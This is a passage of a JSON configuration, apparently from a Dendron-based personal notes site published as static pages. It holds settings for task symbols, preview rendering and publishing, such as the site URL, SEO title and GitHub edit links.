","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"taskCompleteStatus":["done","x"],"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link"},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":true,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"enableFullHierarchyNoteTitle":false},"preview":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false},"publishing":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"My Dendron Notes","description":"Personal Knowledge Space"},"github":{"enableEditLink":true,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enableTaskNotes":true,"enablePrettyLinks":true,"searchMode":"search","assetsPrefix":"/Notes","siteUrl":"https://greguus.github.io/","enableHierarchyDisplay":false,"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true}